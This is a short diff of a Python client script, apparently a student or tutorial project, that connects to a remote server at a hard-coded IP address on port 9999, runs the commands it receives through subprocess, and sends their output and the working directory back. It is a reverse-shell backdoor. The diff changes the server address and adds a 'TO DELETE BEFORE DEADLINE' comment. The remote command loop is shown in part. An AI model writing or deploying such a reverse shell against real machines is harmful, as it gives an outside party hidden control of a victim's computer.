@@ -3,7 +3,7 @@ import os
 import subprocess
 
 
-host = '10.4.160.62' # change that to the IP address of the server
+host = '10.1.162.188' # change that to the IP address of the server
 port = 9999 
 s = socket.socket()
 
@@ -21,7 +21,8 @@ while True:
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte, "utf-8")
         s.send(str.encode(output_str + str(os.getcwd) + '> '))
-
+        
+        # TO DELETE BEFORE DEADLINE
         print (output_str) # print the output of the command on the client machine
 
 
